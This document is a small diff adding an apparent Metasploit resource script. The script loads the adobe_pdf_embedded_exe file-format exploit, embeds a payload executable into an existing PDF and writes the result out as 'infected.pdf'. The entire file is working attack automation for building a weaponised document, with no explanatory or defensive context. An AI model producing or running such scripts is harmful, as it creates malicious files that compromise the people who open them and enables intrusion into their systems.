@@ -1,0 +1,7 @@
+use exploit/windows/fileformat/adobe_pdf_embedded_exe
+set FILENAME infected.pdf
+set INFILENAME pdf/rib.pdf
+set EXENAME pdf/payload.exe
+set OUTPUTPATH pdf/output
+exploit
+exit
